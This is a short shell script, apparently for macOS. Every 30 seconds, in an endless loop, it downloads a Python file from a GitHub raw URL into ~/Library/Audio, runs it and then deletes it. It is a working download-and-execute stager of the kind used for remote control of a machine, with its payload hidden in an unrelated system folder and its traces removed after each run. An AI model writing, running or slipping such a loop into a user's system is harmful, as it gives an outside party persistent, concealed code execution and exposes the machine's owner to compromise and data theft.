run() {
    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/3_main.py -o ~/Library/Audio/3_main.py

    python3 ~/Library/Audio/3_main.py

    rm ~/Library/Audio/3_main.py
}

while true; do
    run

    sleep 30
done
